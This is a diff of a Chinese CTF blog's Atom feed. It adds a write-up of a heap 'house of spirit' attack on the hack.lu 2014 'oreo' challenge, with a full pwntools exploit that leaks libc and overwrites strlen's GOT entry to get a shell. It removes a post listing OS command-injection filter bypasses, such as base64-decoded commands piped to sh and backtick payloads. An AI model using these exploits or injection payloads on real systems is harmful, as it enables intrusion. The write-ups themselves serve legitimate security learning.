@@ -1,15 +1,121 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
-    <title>Cyurl3_BLOG</title>
-    <updated>2020-06-14T04:27:27.821Z</updated>
+    <title>柠檬的博客</title>
+    <updated>2020-07-11T14:41:10.314Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
-    <subtitle>我是一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。</subtitle>
+    <subtitle>我是一个热爱信息安全的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。</subtitle>
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2020, Cyurl3_BLOG</rights>
+    <rights>All rights reserved 2020, 柠檬的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[fastbin attack(house of sprit) - 2014 hack.lu oreo]]></title>
+        <id>https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/</id>
+        <link href="https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/">
+        </link>
+        <updated>2020-07-11T14:17:26.000Z</updated>
+        <content type="html"><![CDATA[<p>题目是这样shai的<br>
+<img src="https://zhangzy999.github.io//post-images/1594477169098.png" alt="" loading="lazy"><br>
+大概是个枪支商店，可以添加枪支，释放枪支，展示枪支信息，留言等等<br>
+然后这个例题难度主要是在逆向分析上，很令人恼火（<br>
+然后说一下house of sprit攻击手法<br>
+主要是有一个目标区域我们没办法控制，但是这个区域之前和之后的区域我们可以控制，我们控制区域之前主要是为了来伪造chunk的size，让其绕过检查机制，控制目标区域之后的位置主要是伪造the next chunk的size，next chunk 的大小不能小于 2 * SIZE_SZ（两个字长），同时也不能大于av-&gt;system_mem，然后还有类似与那种检查size位的ISMMAP位等容易满足的检查，我直接放个wiki上的图，方便以后复习用。<br>
+<img src="https://zhangzy999.github.io//post-images/1594477558899.png" alt="" loading="lazy"><br>
+我是懒狗，不截图了，直接大致说说整体的思路好了<br>
+add功能：<br>
+添加枪支结构体，我们可以输入名字和描述，在名字的位置的地方可以进行堆溢出，覆盖最后一个字长，最后一个字长存储上一个chunk的地址。<br>
+show功能：<br>
+本题目没有后门，我们只能泄露libc基址来拿到system地址，我们选择free函数来泄露即可，由于延迟绑定机制，我们提前申请和释放一个堆块来处理。通过show的打印功能，我们可得到free@got，进而得到system地址。<br>
+free功能：<br>
+从最后一个堆块开始，依次向前free所有堆块。这里的话我们伪造的chunk不在链表的最后部位，即程序无法检测到double free，可以放心的van~<br>
+message功能：<br>
+可以写入留言信息，message指针位于bss段，同时指向bss段某个位置，我们可以写入留言，然后立即调用strlen函数进行一些检查，那么我们可以考虑在message指针这个部位伪造一个chunk，修改message指针到strlen函数的地址，然后我们写入system的地址，这样函数就给我们调用system了。<br>
+综上所述，泄露system地址，然后利用heap overflow伪造一个bss_chunk，然后我们free。（值得一提的是，我们在这之前，bss_chunk_data指针-0x4的位置应该是伪造的chunk的size域，而这个地方恰好是记录了我们add了多少次chunk的变量，所以在exp里我们用了一个for循环来申请chunk，使其变为0x40，来伪造其size。之后我们可以用message功能，编辑信息，伪造next chunk的size。）free之后我们malloc，就得到了一个可控指针，我们劫持strlen函数改为system，传入参数&quot;;/bin/sh\x00&quot;，举个例子，system(&quot;ls;/bin/sh&quot;)相当于分别传入参数ls和binsh，大概就是这个原理，直接写exp</p>
+<pre><code>from pwn import *
+
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+libc = ELF('./libc.so.6')
+p = process('./oreo')
+elf = ELF('./oreo')
+#context.log_level = 'debug' 
+
+def add(name,description):
+	#p.recvuntil('Action: ')
+	p.sendline('1')
+	#p.recvuntil('Rifle name: ')
+	p.sendline(name)
+	#p.recvuntil('Rifle description: ')
+	#pause()
+	p.sendline(description)
+
+def show():
+	#p.recvuntil('Action: ')
+	p.sendline('2')
+
+def free():
+	#p.recvuntil('Action: ')
+	p.sendline('3')
+
+def edit_message(message):
+	#p.recvuntil('Action: ')
+	p.sendline('4')
+	#p.recvuntil('Enter any notice you\'d like to submit with your order: ')
+	p.sendline(message)
+
+def show_current():
+	#p.recvuntil('Action: ')
+	p.sendline('5')
+
+print &quot;====================================&quot;
+print 'step1: leak libc'
+
+add('a','b')
+free() 
+name = 'A' * 27 + p32(elf.got['free'])
+#print 'name:' + name
+description = 'A' * 25
+add(name,description)
+
+show()
+
+p.recvuntil(25*'A')
+p.recvuntil('Description: ')
+free_addr = u32(p.recvuntil('\n',drop = True)[0:4])
+print 'free_address: ' + hex(free_addr)
+libc_base = free_addr - libc.symbols['free']
+system_addr = libc_base + libc.symbols['system']
+print 'system_addr: ' + hex(system_addr)
+
+print &quot;====================================&quot;
+print 'step2: alloc to bss'
+
+# add 0x40 to change the newtimes which replace the size to bypass check
+for i in range(0x40 - 0x2 - 0x1):
+	add('a'*27 + p32(0),'b')
+
+message_pointer = 0x0804a2a8  # fake chunk
+payload = 27*'A' + p32(message_pointer)
+add(payload,'a')
+
+payload = (0x38 - (0x0804a2c0 - 0x0804a2a8) - 0x4) * 'A' + 0x4 * '\x00' + 'aaaa' + p32(0x100)         # in order to bypass the next chunk size check
+edit_message(payload)
+free()
+
+print &quot;======================================&quot;
+print 'step3: attack func &quot;strlen&quot; to get shell'
+
+payload = p32(elf.got['strlen'])
+add('hack',payload)
+edit_message(p32(system_addr) + ';/bin/sh\x00')
+
+p.interactive()
+</code></pre>
+<p>拿shell，很奈斯<br>
+我太菜了</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[buuctf：pwn刷题记录（一）]]></title>
         <id>https://zhangzy999.github.io/post/buu_pwn_1/</id>
@@ -738,106 +844,6 @@ p.interactive()
 </code></pre>
 <p>然后就拿到了flag<br>
 <img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[GXYCTF2019]Ping Ping Ping—os命令总结]]></title>
-        <id>https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/</id>
-        <link href="https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/">
-        </link>
-        <updated>2020-05-21T00:34:14.000Z</updated>
-        <content type="html"><![CDATA[<p>打开环境，是如下页面<br>
-<img src="https://zhangzy999.github.io//post-images/1590021358928.png" alt="" loading="lazy"><br>
-应该是让我们用get方法传一个参数ip，然后执行系统的ping命令，我们ls一下看看页面是如何回显的<br>
-<img src="https://zhangzy999.github.io//post-images/1590021468013.png" alt="" loading="lazy"><br>
-有flag.php和index.php，直接访问不会有回显，猜测flag在注释里面，那我们cat一下flag.php<br>
-<img src="https://zhangzy999.github.io//post-images/1590021575630.png" alt="" loading="lazy"><br>
-显示&quot;fxck your space&quot;……<br>
-应该是过滤了空格emm，那么我们先总结一下os命令执行的常见的绕过方法：<br>
-1，过滤空格：</p>
-<pre><code>过滤空格：可以用以下字符代替
-&lt;&gt;
-&lt;
-${IFS}
-$IFS$1
-{cat,flag.php}
-</code></pre>
-<p>2，过滤关键字或者一些纳入黑名单的敏感文件名：</p>
-<pre><code>黑名单	绕过：
-拼接：cat test.txt  =  a=c;b=at;c=test;d=.txt $a$b $c$d 
-base64编码:  `echo Y2F0IHRlc3QudHh0|base64 -d`
-               echo Y2F0IHRlc3QudHh0|base64 -d|bash
-               echo Y2F0IHRlc3QudHh0|base64 -d|sh
-单双引号：ca''t tes&quot;&quot;t.txt
-反斜线：ca\t tes\t.txt
-$符号：ca$@t te$9st.txt
-cat等价替换：more less head tac tail vim等等……
-通配符：
-/???/?at ????.???
-/???/?[a][t] ????.???
-</code></pre>
-<p>3，做长度上的限制：</p>
-<pre><code>长度限制 绕过：
-（&gt;是写入一个文件，但是内容会清空，&gt;&gt;是在文件末尾追加，\是换行符）
-echo  &quot;cat\\&quot; &gt; cmd
-echo &quot;tes\\&quot;&gt;&gt;cmd
-echo &quot;t.txt&quot;&gt;&gt;cmd
-sh cmd
-</code></pre>
-<p>有了以上办法，它既然过滤了空格，我们用以下几种形式来代替</p>
-<pre><code>1: ?ip=1|cat${IFS}flag.php
-2: ?ip=1|cat&lt;&gt;flag.php
-3: ?ip=1|cat&lt;flag.php
-4: ?ip=1|{cat,flag.php}
-5: ?ip=1|cat$IFS$1flag.php
-</code></pre>
-<p>前四种方法都是&quot;fxck your symbol!&quot;，猜测是对特殊字符做了过滤，但是cao dan的是我们不知道过滤了啥<br>
-<img src="https://zhangzy999.github.io//post-images/1590022142460.png" alt="" loading="lazy"><br>
-第五种方法可以！<br>
-<img src="https://zhangzy999.github.io//post-images/1590022258690.png" alt="" loading="lazy"><br>
-没有fxck your space，space，而是fuck flag……<br>
-没事儿，既然能突破前两重限制，那应该离胜利不远了，尝试拼接法拼flag无果后，我们读一下index.php</p>
-<pre><code>?ip=1|cat$IFS$1index.php
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://zhangzy999.github.io//post-images/1590022474723.png" alt="" loading="lazy"></figure>
-<pre><code class="language-php">&lt;?php
-if(isset($_GET['ip'])){
-  $ip = $_GET['ip'];
-  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
-    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
-    die(&quot;fxck your symbol!&quot;);
-  } else if(preg_match(&quot;/ /&quot;, $ip)){
-    die(&quot;fxck your space!&quot;);
-  } else if(preg_match(&quot;/bash/&quot;, $ip)){
-    die(&quot;fxck your bash!&quot;);
-  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
-    die(&quot;fxck your flag!&quot;);
-  }
-  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
-  echo &quot;&lt;pre&gt;&quot;;
-  print_r($a);
-}
-?&gt;
-</code></pre>
-<p>可以看到上面就是我们的过滤规则了，推荐一个调试正则的网站：https://regex101.com<br>
-我们已经突破前两重过滤，我们直接看最后一个带有flag的过滤规则就好<br>
-<img src="https://zhangzy999.github.io//post-images/1590022906117.png" alt="" loading="lazy"><br>
-可以看到只要有flag出现就不可以，无论它们中间有多少字符，但是咧，不出现flag.php<br>
-出现f$a是不会触发正则的，我们可以用拼接法来拼接flag：</p>
-<pre><code>?ip=1;a=lag.php;cat$IFS$1f$a;
-</code></pre>
-<p><img src="https://zhangzy999.github.io//post-images/1590023132426.png" alt="" loading="lazy"><br>
-bingo!<br>
-当然还有以下三种解法<br>
-1，(看源码知道bash被过滤)我们用sh来代替进行base64编码</p>
-<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
-</code></pre>
-<p>2，反引号里面的字符串会被当作命令执行</p>
-<pre><code>?ip=1;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d`
-</code></pre>
-<p>3，反引号里面的字符串不仅可以被当作命令执行，命令执行的结果还可被当作输入</p>
-<pre><code>?ip=1;cat$IFS$1`ls`   等价于    cat flag.php index.php
-</code></pre>
 ]]></content>
     </entry>
 </feed>
